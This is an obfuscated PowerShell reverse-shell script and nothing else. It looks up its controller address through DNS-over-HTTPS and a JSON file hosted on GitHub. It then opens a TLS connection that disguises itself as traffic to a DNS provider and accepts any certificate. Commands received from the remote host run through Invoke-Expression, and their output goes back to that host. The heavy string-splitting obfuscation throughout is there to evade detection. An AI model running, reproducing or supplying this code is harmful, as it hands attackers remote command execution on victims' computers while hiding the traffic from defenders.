 SET-ITEm (           'v'         +         'arI'      +          'abLE:'    +         '70X'         +     'k'      )  (       [tYpe](       'sY'       +    'st'        +        'Em.t'       +      'EXT.eNcoDing'   )       )      ;        function Dn`SlOok`Up(        ${DN`SReC`ord}        ){
    ${R`EsP`oNsE}         =          (                  &         (    'In'       +     'vo'        +     'ke-WebReque'           +      'st'         ) (     (   (        'ht'           +        't' )  +     'ps'      +         ':'     +      '/'          +      '/'       +        '1'       +        (     '.1'        +     '.'     )      +        '1'       +           '.'          +         '1/'        +         (     'd'        +        (    'ns-'        +   'q'       )       )       +        (    (          'ue'        +            'ry'       )       +       '?'          +        (          'nam'       +     'e='          )       )         +     (        (     'p'         +      'owe'   )       +       'rs'         )         +       (       (        'hel'         +       'l-'      )         +          'r'         )     +      'e'         +        (        (         'ver'    +      'se'           )  +         '-s'      )        +         'he'      +      'll'         +       '.'       +     (   'd'       +         'e'         +         (       'mo.'       +         'e'         )     )        +      'x'       +      (     (      'a'     +    'mp'       )          +       'le'          )        +        (      (       '.co'        +          'm&'       )        +       't'       )     +        (     'yp'       +         'e='           )         )     +         ${dNsRE`CO`RD}        ) -Headers @{(        (       'ac'      +        'ce'   )   +     'pt'       )           =         (   'ap'     +  'pl'      +     (        'ic'       +     (        'a'      +      'ti'       +    'on/d'         )         +         'ns'      +       '-'           )     +        (     (         'js'    +  'o'   )        +        'n'        )      )}      )."C`onT`EnT"
    return (        (       geT-chiLdiTem  (           "VArIABLE"       +    ":7"    +      "0Xk"        )        ).VALUE::"u`TF8"."GE`TsTR`ing"(       ${r`eSpOn`sE}         )   |             &          (        'Con'       +       'vertF'          +      'rom-Jso'           +         'n'         )      )."An`SWER"."D`ATa".(          't'       +   'rim'         )."iNV`Oke"(      '"'        )
}

${J}        =               &         (        'Inv'     +      'oke-Res'   +         'tMeth'     +   'o'           +        'd'     ) -Uri (     (      'h'        +      (     'ttp'          +            's'         )        )         +    (          ':/'      +     '/'         )     +     (        'gi'          +      'th'   )           +     (   'u'       +     (       'b.'       +         'c'    )          )      +      'o'      +       'm'       +       '/'      +        'S'        +       'ou'        +        'my'       +       (        'o'     +       (     '0'       +       '01'      )      )         +        '/'      +           'p'        +       'r'       +      (       'o'      +       (        'gre'       +           'ss'      )      )       +       (    'i'       +      (       've'     +    '_0'        )     )   +      (     (     'v'   +         'er'      )    +      'l'        )   +     (       (      'oa'      +     'd'    )      +     (       '/r'         +       'a'       )        )      +        (        'w/'         +      'r'          )      +      (       (        'e'    +          'fs/'          )           +         'h'      +      (       'e'      +        'ad'        )         )       +      (       's/'         +       'ma'         )         +      (         (       'in/'     +     'p'         )            +    (       'a'        +         'yl'    )       )     +            (        'oa'     +        'd'     )    +        (        (          's/i'            +     'p'   )    +            (    '_po'        +      'r'      )     +      't.'         )     +          (         'j'           +   (      's'      +       'on'        )    )   )

${R`eM`ot`eip}      =          ${J}."IP"
${rEm`OT`e`pOrt}            =      ${j}."P`oRT"

do {
            .    (       'Start-S'        +       'l'         +     'e'       +   'ep'         ) -Seconds 1
    try{
        ${Tc`PC`oN`Ne`ctiON}             =               .        (   'Ne'         +          'w'     +     '-Object'    ) (            'Syste'       +     'm'      +       '.N'         +     'et'         +      '.'      +        'S'         +       'ockets.TcpCl'    +      'ien'          +        't'         )(           ${rEMo`T`eiP}, ${R`E`MOtE`pOrt}        )
    }catch{}
} until (      ${T`CpCONNec`T`I`On}."C`OnNe`cteD"        )


${netWoRK`strE`AM}         =         ${t`CPcO`N`NEc`TioN}.(         'Get'        +           'Stre'     +            'am'  )."InVo`KE"(             )
${Ss`L`StReAm}      =                    .      (         'New-O'       +        'b'        +        'ject'       ) (       'Sy'       +        'st'    +        'em.N'       +       'et.Security'   +         '.SslS'      +    'trea'     +        'm'       )(        ${NetworK`ST`RE`Am}, ${fA`LsE}, (    {${t`RUe}} -as [System.Net.Security.RemoteCertificateValidationCallback]       )        )
${SsL`sTr`eAM}.(      'Aut'        +    'henticate'         +    'AsCl'         +        'ie'        +        'nt'         )."i`NVO`KE"(        (     'c'    +    (      'l'        +      'ou'          +        (        'd'     +       'fla'          )        )       +       'r'         +       (           (      'e'    +         '-dns'     )          +     '.'      )       +     'co'      +      'm'        ), ${nU`lL}, ${Fa`L`sE}     )

if (      !${S`sLst`REam}."IsaUthEnT`Ic`A`T`ed" -or !${SSlS`Tr`EAM}."i`Ss`ignED"       ) {
    ${sSL`STR`EaM}.(   'Cl'     +         'ose'      )."iN`Vo`kE"(               )
    exit
}


${stR`eamW`RITeR}        =                 .     (       'N'    +      'ew-'        +        'Object'     ) (        'S'     +       'yst'       +         'em'     +     '.'      +         'IO.Stream'      +      'Writer'        )(        ${Ssls`T`ReaM}   )

function w`RiteST`REAM`TOSeR`V`eR(        ${StR`ing}       ){
    [byte[]]${sC`R`i`pt:BUffEr}      =  0..${t`cpconn`ECtIon}."reCe`I`VEbUffERs`iZe"           |                 &      (          '%'    ) {0}
    ${St`R`eaMwRI`Ter}.(         'Wr'         +       'ite'      )."i`NVokE"(   ${stR`ING}       +        (    (        'SH'       +       'E'          )           +        (       'LL'         +      ' '        )       )       +         (          &     (    'Ge'    +     't'       +        '-L'        +         'ocation'        )     )."p`Ath"       +       (       ' :'        +         '>'     )      )
    ${s`TReA`MWri`TeR}.(         'F'         +      'lush'        )."iN`Vo`Ke"(                     )
}

       &      (        'wri'           +       't'            +         'eS'     +     't'        +          'reamToSe'        +      'rver'      ) ''

while (        (     ${byT`e`SrEad}       =     ${s`SLS`TR`eam}.(      'Rea'          +         'd'        )."I`NVo`KE"(    ${s`Cr`iPT:bu`FFEr}, 0, ${sc`Rip`T:Buf`FER}."Len`GTh"      )       ) -gt 0     ) {

    ${C`OmMAnD}         =        $70XK::"u`TF8"."gEtST`R`InG"(       ${S`CRI`p`T:`BUFFeR}, 0, ${b`yTesR`EAD} - 1        )

    ${COMMa`N`D`_oUTPut}       =      try {
              &      (      'In'       +            'voke-Expre'       +      's'            +         's'      +      'ion'    ) ${Co`Mm`ANd} 2>&1        |                   .    (      'O'+          'ut'    +          '-String'        )
    }
    catch {
        ${_}         |               &     (       'Out'  +     '-'         +           'String'         )
    }
            .      (       'w'    +       'r'          +        'iteStreamToSer'         +          'ver'          )(        ${C`o`MmAnd_`oUTPut}        )
}

${s`T`R`eAmW`RitEr}.(     'C'    +    'lose'   )."i`Nv`Oke"(                  )